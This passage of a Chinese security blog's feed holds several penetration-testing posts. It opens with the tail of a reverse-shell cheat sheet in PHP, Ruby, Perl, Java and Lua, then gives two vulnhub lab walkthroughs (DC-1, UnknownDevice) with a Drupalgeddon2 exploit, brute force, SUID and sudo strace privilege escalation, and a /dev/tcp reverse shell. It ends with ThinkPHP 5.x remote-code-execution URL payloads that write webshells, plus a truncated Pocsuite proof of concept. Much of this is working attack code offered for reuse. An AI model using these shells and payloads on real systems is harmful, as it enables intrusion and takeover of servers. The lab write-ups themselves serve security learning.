&gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock = fsockopen(<span class="string">'192.168.220.131'</span>, <span class="number">6666</span>);</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">      <span class="number">0</span> =&gt; $sock,</span><br><span class="line">      <span class="number">1</span> =&gt; $sock,</span><br><span class="line">      <span class="number">2</span> =&gt; $sock</span><br><span class="line"> );</span><br><span class="line"> $process = proc_open(<span class="string">'/bin/sh'</span>, $descriptorspec, $pipes);</span><br><span class="line"> proc_close($process);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'f=TCPSocket.open("192.168.220.131",6666).to_i;exec &gt; sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">"exit if fork;soc=TCPSocket.new('192.168.220.140',6666);while(soc.print 'shell&gt;';cmd=soc.gets);IO.popen(cmd,'r')&#123;|io|soc.print io.read&#125;end"</span></span><br></pre></td></tr></table></figure><h2 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h2><blockquote><p><strong>TCP</strong></p></blockquote><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -MSocket -e <span class="string">"\$i='192.168.220.140';\$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i))))&#123;open(STDIN,'&gt;&amp;S');open(STDOUT,'&gt;&amp;S');open(STDERR,'&gt;&amp;S');exec('/bin/sh -i');&#125;;"</span></span><br></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -MIO::Socket::INET -e <span class="string">"exit,if(fork);\$soc=new IO::Socket::INET(PeerAddr,'192.168.220.140:'.6666);\$soc-&gt;send('shell&gt;');STDIN-&gt;fdopen(\$soc,r);$~-&gt;fdopen(\$soc,w);system\$_ while&lt;&gt;;"</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>UDP</strong><br>ps:<code>nc -luvvp</code></p></blockquote><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -MIO::Socket::INET -e <span class="string">'$|=1;$soc = new IO::Socket::INET(PeerAddr =&gt; "192.168.220.140:".6666,Proto =&gt; "udp");while(1)&#123;$soc-send("shell&gt;");$soc-&gt;recv($inp,1024);$h=$soc-&gt;peerhost();$p=$soc-peerport();$d=qx($inp);$soc-&gt;send($d);&#125;'</span></span><br></pre></td></tr></table></figure><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;);</span><br><span class="line">p.waitFor();</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span>&#125;);</span><br><span class="line">p.waitFor();</span><br></pre></td></tr></table></figure><h2 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h2><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('192.168.220.131','6666');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;NC&quot;&gt;&lt;a href=&quot;#NC&quot; class=&quot;headerlink&quot; title=&quot;NC&quot;&gt;&lt;/a&gt;NC&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;nc -lvvp 6666&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;nc -e /bin/sh 192.168.220.140 6666&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;Bash&quot;&gt;&lt;a href=&quot;#Bash&quot; class=&quot;headerlink&quot; title=&quot;Bash&quot;&gt;&lt;/a&gt;Bash&lt;/h2&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://t43wiu6.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>渗透实战:DC-1靶机入侵</title>
    <link href="https://t43wiu6.github.io/2019/03/23/DC-1/"/>
    <id>https://t43wiu6.github.io/2019/03/23/DC-1/</id>
    <published>2019-03-23T21:30:06.000Z</published>
    <updated>2019-03-28T02:31:43.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-序章"><a href="#0x01-序章" class="headerlink" title="0x01 序章"></a>0x01 序章</h2><ul><li>作者:DCAU</li><li>难度定位:未知，初级?</li><li>目标:共有五个flag，但最终目标是在root的主目录中</li></ul><h2 id="0x02-新玩意"><a href="#0x02-新玩意" class="headerlink" title="0x02 新玩意"></a>0x02 新玩意</h2><a id="more"></a><p>这次来尝试一下<code>新玩意</code>，NetDiscover</p><p>这个发现工具我还是第一次用，虽然听说过很多次</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先指定一下网卡</span></span><br><span class="line">sudo netdiscover -i eth2</span><br></pre></td></tr></table></figure><p><img src="NetDiscover.PNG" alt=""></p><blockquote><ul><li>192.168.135.131</li></ul></blockquote><p>鉴于上次的经验，这次我指定了更全面的扫描</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV -sS -p- 192.168.135.131</span><br></pre></td></tr></table></figure><p><img src="Nmap.PNG" alt=""></p><p>先试下admin，<code>Access denied</code>，好吧</p><p>那来跑下目录</p><p>然后…..然后站就被我跑崩了,🤦つ﹏⊂</p><p><img src="error.PNG" alt=""></p><p>重启一下虚拟机，不跑了不跑了，先看看robots吧</p><p><img src="robots.PNG" alt=""></p><p>通过UPGRADE.txt和MAINTAINERS.txt基本可以确认是Drupal 7.x(9 or 10)</p><h2 id="0x03-Drupalgeddon2-GetShell"><a href="#0x03-Drupalgeddon2-GetShell" class="headerlink" title="0x03 Drupalgeddon2 GetShell"></a>0x03 Drupalgeddon2 GetShell</h2><p><img src="drupalgeddon2.PNG" alt=""></p><p>对于Drupal，我找到一个历害的洞，是远程命令执行</p><p><img src="msf.PNG" alt=""></p><p>Msf中也有，但利用并不顺利</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.135.131</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter_reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.135.130</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="msferror.PNG" alt=""></p><p>反而在searchsploit中找到一个基于ruby的可用exp</p><p><img src="searchsploit.PNG" alt=""></p><p>成功拿到了shell，但我不死心再度尝试msf</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> payload php/reverse_php</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>事实证明，能弹回来</p><p>我再次进行一些测试</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php/meterpreter_reverse_tcp PHP Meterpreter, Reverse TCP Inline</span><br><span class="line">php/meterpreter/reverse_tcp PHP Meterpreter, PHP Reverse TCP Stager</span><br><span class="line">generic/shell_reverse_tcp   Generic Command Shell, Reverse TCP Inline</span><br><span class="line">php/reverse_php             PHP Command Shell, Reverse TCP (via PHP)</span><br></pre></td></tr></table></figure><p>前两者一个是使用命令行回连，一个是使用php回连，php回连能连上但无权限</p><p><img src="meterpreter.PNG" alt=""></p><p>而普通的generic和php都能正常工作，好的，可以说明是meterpreter的锅</p><p>然而体验还不如那个ruby的exp，卒~</p><h2 id="0x04-Flag1-amp-Flag2"><a href="#0x04-Flag1-amp-Flag2" class="headerlink" title="0x04 Flag1&amp;Flag2"></a>0x04 Flag1&amp;Flag2</h2><p>进来web目录下有一个flag1</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">DC-1&gt;&gt; cat flag1.txt</span><br><span class="line">Every good CMS needs a config file - and so <span class="keyword">do</span> you.</span><br></pre></td></tr></table></figure><p>很明显的提示，一顿搜索，Drupal的配置文件在<code>sites/default/settings.php</code></p><p><img src="flag2.PNG" alt=""></p><blockquote><p>Getflag2<br>db:drupaldb<br>username:dbuser<br>password:R0ck3t</p></blockquote><p>那我们连上去mysql看看</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure><p>然而乱七八糟啥有用的信息都找不到</p><p>期间我又重新弹了一次shell，后来发现<br><img src="kernel.PNG" alt=""></p><p>哇咔咔，你懂的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o2 up.c</span><br></pre></td></tr></table></figure><p>随后</p><p><img src="PyhtonServer.PNG" alt=""></p><p>我在本机搭建了一个简易的python服务器</p><p>并wget拿到exp</p><p><img src="wget.PNG" alt=""></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x 2</span><br><span class="line">./2</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>然后再看一下别的路</p><h2 id="0x05-SSH爆破提权"><a href="#0x05-SSH爆破提权" class="headerlink" title="0x05 SSH爆破提权"></a>0x05 SSH爆破提权</h2><p>这时我又想起了flag2的提示，跑字典.同时passwd中一个账号吸引了我的注意</p><p><img src="flag4hint.PNG" alt=""></p><p>就是它了。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[22][ssh] host: 192.168.135.131   login: flag4   password: orange</span><br></pre></td></tr></table></figure><p>橙子，发现home下还有个flag4</p><p><img src="flag4.PNG" alt=""></p><h2 id="0x06-基于find提权"><a href="#0x06-基于find提权" class="headerlink" title="0x06 基于find提权"></a>0x06 基于find提权</h2><blockquote><p>注意：我在发现flag4前就已经通过find拿到root了，为了方便观看我把过程放到了这里，所以有些图片中的终端名对不上了</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="find.PNG" alt=""></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">exec</span> /bin/sh \; -quit</span><br></pre></td></tr></table></figure><p>find中提供了一处命令执行功能</p><p><img src="find2.PNG" alt=""></p><p><img src="thefinalflag.PNG" alt=""></p><h2 id="0x07-Flag3"><a href="#0x07-Flag3" class="headerlink" title="0x07 Flag3"></a>0x07 Flag3</h2><p>虽然已经拿到了root并集齐了四个flag</p><p>但并没有找到flag3，同时想起flag2中将我们引向数据库的目的</p><p>数据库我仔细翻找过，并没有特殊的东西，我们能做的东西不多比如:得到管理员密码</p><p>那有什么用呢，登录后台?</p><p><img src="admin.PNG" alt=""></p><p>如果是一般情况，估计只有跑john了，但这次不一样，我们知道盐</p><p><img src="salt.PNG" alt=""></p><p>啊！还有更省事的方法，drupal自带了了加密</p><p><img src="password-hash.PNG" alt=""></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$S</span><span class="variable">$DaVfvVLfyV4XMvqLm29dqXIRcxQRwUfkmDpfTKmULeuNPKDBk6p</span>.</span><br></pre></td></tr></table></figure><p>到数据库中</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> pass = <span class="string">'$S$DaVfvVLfyV4XMvqLm29dqXIRcxQRwUfkmDpfTKmULeuNPKDBk6p.'</span> <span class="keyword">where</span> uid=<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p><img src="flag3.PNG" alt=""></p><p>看样子我是直接跳过了hint，拿root了emmmmmm</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-序章&quot;&gt;&lt;a href=&quot;#0x01-序章&quot; class=&quot;headerlink&quot; title=&quot;0x01 序章&quot;&gt;&lt;/a&gt;0x01 序章&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;作者:DCAU&lt;/li&gt;
&lt;li&gt;难度定位:未知，初级?&lt;/li&gt;
&lt;li&gt;目标:共有五个flag，但最终目标是在root的主目录中&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;0x02-新玩意&quot;&gt;&lt;a href=&quot;#0x02-新玩意&quot; class=&quot;headerlink&quot; title=&quot;0x02 新玩意&quot;&gt;&lt;/a&gt;0x02 新玩意&lt;/h2&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://t43wiu6.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>渗透实战:UnknownDevice靶机入侵</title>
    <link href="https://t43wiu6.github.io/2019/03/22/UnknownDevice/"/>
    <id>https://t43wiu6.github.io/2019/03/22/UnknownDevice/</id>
    <published>2019-03-23T00:52:20.000Z</published>
    <updated>2019-03-27T11:51:04.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><ul><li>难度定位:中级</li><li>作者：Ajay Verma</li><li>目标:获得root并阅读/root/flag.txt</li></ul><a id="more"></a><h2 id="0x02-主机扫描"><a href="#0x02-主机扫描" class="headerlink" title="0x02 主机扫描"></a>0x02 主机扫描</h2><p>先扫一波</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.135.129</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)</span><br><span class="line">|_http-server-header: SimpleHTTP/0.6 Python/2.7.14</span><br><span class="line">|_http-title:    Website By Unknowndevice64   </span><br><span class="line">MAC Address: 00:0C:29:F9:6F:F5 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br></pre></td></tr></table></figure><blockquote><p>port 31337 python的简易HTTPServer</p></blockquote><p><img src="31337.png" alt=""></p><p><img src="hint.png" alt=""></p><p>代码有hint</p><h2 id="0x03-图片隐写术"><a href="#0x03-图片隐写术" class="headerlink" title="0x03 图片隐写术"></a>0x03 图片隐写术</h2><p><img src="hidden.png" alt=""></p><p>是图片隐写，先后拿HxD和Stegsolve分析过，都不行</p><p>看了wp才知道要用steghide，出师不利</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">steghide --extract -sf key_is_h1dd3n.jpg</span><br></pre></td></tr></table></figure><p>密码是h1dd3n</p><p>得到一串奇怪的东西</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++.-----------------.&lt;----------------.--.++++++.---------.&gt;-----------------------.&lt;&lt;+++.++.&gt;+++++.--.++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++.-----------------.</span><br></pre></td></tr></table></figure><p>看着这串，倒是想到了以前接触过的jsfuck，但其实又不一样</p><p>查了些资料感觉可能是BrainFuck</p><p><img src="brainfuck.png" alt=""></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ud64:1M!<span class="comment">#64@ud</span></span><br></pre></td></tr></table></figure><p>还以为是啥加密，折腾许久，再次走投无路….偶然间发现，这名字emmm</p><p><img src="ud64.png" alt=""></p><p>这是用户名+密码?可是没有可以登录的地方啊，端口只有<code>31337</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -sV -p 1-65535 192.168.135.129</span><br></pre></td></tr></table></figure><p>指定全端口，再扫一次，1337有SSH，看来就是它了</p><p><img src="ssh.png" alt=""></p><p>进来了??殊不知真正的挑战才刚刚开始</p><h2 id="0x04-rbash限制逃逸"><a href="#0x04-rbash限制逃逸" class="headerlink" title="0x04 rbash限制逃逸"></a>0x04 rbash限制逃逸</h2><p>上来就是ls</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ud64@unknowndevice64_v1:~$ ls</span><br><span class="line">-rbash: /bin/ls: restricted: cannot specify `/<span class="string">' in command names</span></span><br></pre></td></tr></table></figure><p>先来看看这个rbash是个什么东西</p><p><img src="rbash.png" alt=""></p><p>这么变态???，经过一番搜索</p><p>发现可以通过按两下tab键调出可以执行的程序</p><p><img src="tab.png" alt=""></p><p>最终找到两处可绕过限制shell的方法</p><ul><li>vi 执行!/bin/sh</li><li>export PATH=$PATH:/bin/  export PATH=$PATH:/usr/bin</li></ul><p>但权限受限，环境变量是只读，只有vi了</p><p><img src="shell1.png" alt=""></p><p>很好，目前已经获得了一个’’较’’正常的shell，但是权限依然很低</p><p>事实上这只是在vi中运行的一个’shell’，那么先把它提到普通的shell</p><p>比如这样</p><p><img src="shell2.png" alt=""></p><p>这是因为在vi的shell中已经拥有了环境变量的写入权限了</p><h2 id="0x05-破釜沉舟strace到root"><a href="#0x05-破釜沉舟strace到root" class="headerlink" title="0x05 破釜沉舟strace到root"></a>0x05 破釜沉舟strace到root</h2><p>现在依旧没有办法读到root下的flag</p><p>查看了passwd，除root外，有bash的账户还有一个operator</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:x:0:0::/root:/bin/bash</span><br><span class="line">operator:x:11:0:operator:/root:/bin/bash</span><br><span class="line">ud64:x:1000:1000::/home/ud64:/bin/rbash</span><br></pre></td></tr></table></figure><p>但不知道密码，也找不到可行的内核提权</p><p>再度陷入僵局</p><p>最终，在先后检查了环境变量和进程后，在检查sudo可执行命令时发现<br><img src="sysud64.png" alt=""></p><p>可以用sudo执行<code>/usr/bin/sysud64</code>但我并不清楚这是什么程序，幸好有help</p><p>其实这是strace，一个用以诊断，调试的程序，没错调试就意味着运行!</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysud64 -o /dev/null /bin/bash -i &gt;&amp; /dev/tcp/192.168.135.130/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>以root权限进行一次弹shell并把所有调试输出到最爱的黑洞<br><img src="root.png" alt=""></p><p>事后发现其实可以直接执行/bin/bash</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysud64 -o /dev/null /bin/bash</span><br></pre></td></tr></table></figure><p>我不管，我就是要弹，小声逼逼</p><h2 id="0x06-GetFlag"><a href="#0x06-GetFlag" class="headerlink" title="0x06 GetFlag"></a>0x06 GetFlag</h2><p>A hacker does for love what others woud not do for money.</p><p><img src="flag.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;难度定位:中级&lt;/li&gt;
&lt;li&gt;作者：Ajay Verma&lt;/li&gt;
&lt;li&gt;目标:获得root并阅读/root/flag.txt&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://t43wiu6.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透实战" scheme="https://t43wiu6.github.io/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>基于Pocsuite的ThinkPHP 5.x 远程代码执行漏洞利用</title>
    <link href="https://t43wiu6.github.io/2019/01/11/thinkphp-5-x-pocsuite/"/>
    <id>https://t43wiu6.github.io/2019/01/11/thinkphp-5-x-pocsuite/</id>
    <published>2019-01-11T22:58:00.000Z</published>
    <updated>2019-10-12T02:41:41.746Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>半醉半醒日复日,花落花开年复年。</p></blockquote><p>2019了。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><a id="more"></a><p>漏洞分析有很多大佬巨佬做过了，我就不献丑了emmmm<br>给大家找了一篇分析paper，建议去研究研究</p><p><a href="https://xz.aliyun.com/t/3570" target="_blank" rel="noopener">水泡泡</a></p><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><ul><li>漏洞影响:Thinkphp 5.0.23及5.1.31以下(即12月9日安全更新前所有版本)</li><li><img src="thinphp-5.x-release.JPG" alt=""></li><li><a href="https://github.com/top-think/thinkphp" target="_blank" rel="noopener">vulnspy的漏洞源码</a></li><li><a href="http://www.thinkphp.cn/down/p/1.html" target="_blank" rel="noopener">官方漏洞源码</a></li><li><a href="https://github.com/top-think/thinkphp" target="_blank" rel="noopener">官方github源码</a></li><li><a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f" target="_blank" rel="noopener">Thinkphp v5.0.x补丁</a></li><li><a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815" target="_blank" rel="noopener">Thinkphp v5.1.x补丁</a></li><li><a href="https://www.seebug.org/vuldb/ssvid-97767" target="_blank" rel="noopener">seebug</a></li></ul><p>注意:官网只有5.0.x的版本，测试5.1.x需要到github自己clone一个再用composer安装或者用vulnspy的</p><ul><li><a href="http://www.thinkphp.cn/topic/52362.html" target="_blank" rel="noopener">composer</a></li></ul><h2 id="全平台共有具有漏洞的类"><a href="#全平台共有具有漏洞的类" class="headerlink" title="全平台共有具有漏洞的类"></a>全平台共有具有漏洞的类</h2><p>可以继续挖掘更多payload，我就不(tai)来(cai)了(le)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">think\Route</span><br><span class="line">think\Loader</span><br><span class="line">think\Error</span><br><span class="line">think\App</span><br><span class="line">think\Env</span><br><span class="line">think\Config</span><br><span class="line">think\Hook</span><br><span class="line">think\Lang</span><br><span class="line">think\Request</span><br><span class="line">think\Log</span><br></pre></td></tr></table></figure><h2 id="编写前准备"><a href="#编写前准备" class="headerlink" title="编写前准备"></a>编写前准备</h2><p>对于网上的payload进行了收集,本打算基于以下四个payload进行Poc的编写</p><h3 id="Request-input"><a href="#Request-input" class="headerlink" title="Request/input"></a>Request/input</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</span><br><span class="line">index.php?s=index/\think\Request/input&amp;filter=system&amp;data=echo%20%22&lt;?php%20eval($_POST[cmd])?&gt;%22%20&gt;%20a.php</span><br></pre></td></tr></table></figure><h3 id="Request-cache"><a href="#Request-cache" class="headerlink" title="Request/cache"></a>Request/cache</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?s=index/\think\request/cache&amp;key=1|phpinfo</span><br><span class="line">index.php?s=index/\think\request/cache&amp;key=dir|system</span><br><span class="line">index.php?s=index/\think\request/cache&amp;key=<span class="built_in">echo</span>%20%22&lt;?php%20eval(<span class="variable">$_POST</span>[cmd])?&gt;%22%20&gt;%20a.php|system</span><br></pre></td></tr></table></figure><h3 id="container-invokefunction"><a href="#container-invokefunction" class="headerlink" title="container/invokefunction"></a>container/invokefunction</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?s=index/\think\Container/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"></span><br><span class="line">index.php?s=index/\think\Container/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line"></span><br><span class="line">index.php?s=index/\think\Container/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E</span><br></pre></td></tr></table></figure><h3 id="app-invokefunction"><a href="#app-invokefunction" class="headerlink" title="app/invokefunction"></a>app/invokefunction</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?s=index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"></span><br><span class="line">index.php?s=/index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line"></span><br><span class="line">index.php?s=/index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=<span class="built_in">echo</span>%20%22&lt;?php%20phpinfo();?&gt;%22%20&gt;%20info.php</span><br><span class="line"></span><br><span class="line">index.php?s=/index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E</span><br></pre></td></tr></table></figure><p>还有一个貌似只能写文件的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20eval(<span class="variable">$_POST</span>[123]);?%3C</span><br></pre></td></tr></table></figure><h2 id="Payload测试"><a href="#Payload测试" class="headerlink" title="Payload测试"></a>Payload测试</h2><p>测试的时候发现了些问题</p><p><img src="thinkphp-5.x-test.JPG" alt=""></p><p>前三个paylaod对于5.0.x无效，只有第四个有效</p><p>而5.1.x则通杀</p><p>结合水泡泡的分析</p><p><img src="thinkphp-5.x-shuipaopao.JPG" alt=""></p><p>那就只有app/invokefunction一条路可以走了</p><h2 id="Poc的编写"><a href="#Poc的编写" class="headerlink" title="Poc的编写"></a>Poc的编写</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pocsuite.net <span class="keyword">import</span> req</span><br><span class="line"><span class="keyword">from</span> pocsuite.poc <span class="keyword">import</span> POCBase, Output</span><br><span class="line"><span class="keyword">from</span> pocsuite.utils <span class="keyword">import</span> register</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThinkphpPoC</span><span class="params">(POCBase)</span>:</span></span><br><span class="line">    vulID = <span class="string">'97767'</span></span><br><span class="line">    version = <span class="string">'1'</span></span><br><span class="line">    author = [<span class="string">'p1n3'</span>]</span><br><span class="line">    vulDate = <span class="string">'2019-01-11'</span></span><br><span class="line">    createDate = <span class="string">'2019-01-11'</span></span><br><span class="line">    updateDate = <span class="string">'2019-01-11'</span></span><br><span class="line">    references = [<span class="string">'https://www.seebug.org/vuldb/ssvid-97767'</span>]</span><br><span class="line">    name = <span class="string">'Thinkphp 5.0.23及5.1.31以下 远程代码执行'</span></span><br><span class="line">    appPowerLink = <span class="string">'http://www.thinkphp.cn/'</span></span><br><span class="line">    appName = <span class="string">'Thinkphp'</span></span><br><span class="line">    appVersion = <span class="string">'5.x'</span></span><br><span class="line">    vulType = <span class="string">'RCE'</span></span><br><span class="line">    desc = <span class="string">'''</span></span><br><span class="line"><span class="string">    由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下</span></span><br><span class="line"><span class="string">    可能的远程代码执行导致getshell，受影响包括Thinkphp全版本，建议更新到最新版或开启强制路由</span></span><br><span class="line"><span class="string">     '''</span></span><br><span class="line">    samples = [<span class="string">''</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_verify</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        payload = self.url + <span class="string">'/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array'</span> \</span><br><span class="line">                             <span class="string">'&amp;vars[0]=print_r&amp;vars[1][]=fae0b27c451c728867a567e8c1bb4e53'</span></span><br><span class="line">        response = req.get(payload)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># md5(666) 的值</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'fae0b27c451c728867a567e8c1bb4e53'</span> <span class="keyword">in</span> str(response.content):</span><br><span class="line">            result = &#123;<span 